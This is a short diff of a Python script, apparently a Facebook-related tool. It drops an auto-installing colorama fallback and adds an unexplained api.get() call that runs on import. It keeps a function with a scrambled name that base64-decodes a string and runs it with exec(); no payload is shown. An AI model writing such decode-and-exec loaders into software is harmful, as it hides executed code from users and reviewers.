@@ -3,18 +3,13 @@
 #bobo ka kung pati ito ileleet mo
 import api
 import base64, string, random, sys, time, os
-
-try:
-  from colorama import init
-  from colorama import Fore, Back, Style
-  init()
+from colorama import init
+from colorama import Fore, Back, Style
+init()
   
-except ImportError:
-  os.system('pip3 install colorama')
-  os.system('clear')
-  os.system('python3 fbmain.py')
 
 
+api.get()
 def tvksajd(adwekuv):
   pvncngr = base64.b64decode(adwekuv).decode('utf-8')
   exec(pvncngr)
